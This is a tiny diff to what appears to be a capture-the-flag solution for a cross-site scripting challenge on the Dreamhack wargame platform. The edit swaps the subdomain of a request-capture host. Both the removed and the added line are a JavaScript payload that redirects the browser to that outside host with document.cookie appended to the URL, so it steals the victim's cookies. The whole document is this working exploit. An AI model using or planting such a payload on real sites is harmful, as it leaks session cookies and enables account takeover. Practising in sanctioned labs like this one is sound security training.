@@ -1,2 +1,2 @@
-location.href="https://xabtann.request.dreamhack.games/" + document.cookie;
+location.href="https://eqxkfdf.request.dreamhack.games/" + document.cookie;
 
